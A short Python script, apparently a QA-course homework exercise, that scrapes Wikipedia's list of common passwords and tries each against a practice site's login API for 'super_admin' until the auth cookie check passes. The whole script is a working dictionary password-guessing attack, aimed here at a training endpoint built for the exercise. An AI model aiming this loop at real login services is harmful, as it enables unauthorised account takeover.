import requests
from lxml import html


def get_common_passwords():
    response = requests.get("https://en.wikipedia.org/wiki/List_of_the_most_common_passwords")
    parse_html = html.fromstring(response.text)
    locator = '//*[contains(text(),"Top 25 most common passwords by year according to SplashData")]//..//td[@align="left"]/text()'
    passwords = [str(password).strip() for password in parse_html.xpath(locator)]
    return passwords


def get_secret_password(login, password):
    params = {"login": login, "password": password}
    response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=params)
    return response.cookies.get("auth_cookie") if response.status_code == 200 else None


def check_auth_cookie(auth_cookie):
    cookies = {"auth_cookie": auth_cookie}
    response = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)
    return response.text


login = "super_admin"
for password in get_common_passwords():
    auth_cookie = get_secret_password(login, password)
    result = check_auth_cookie(auth_cookie)
    if result != "You are NOT authorized":
        print(f"Верный пароль: {password}\nРезультат: {result}")
        break
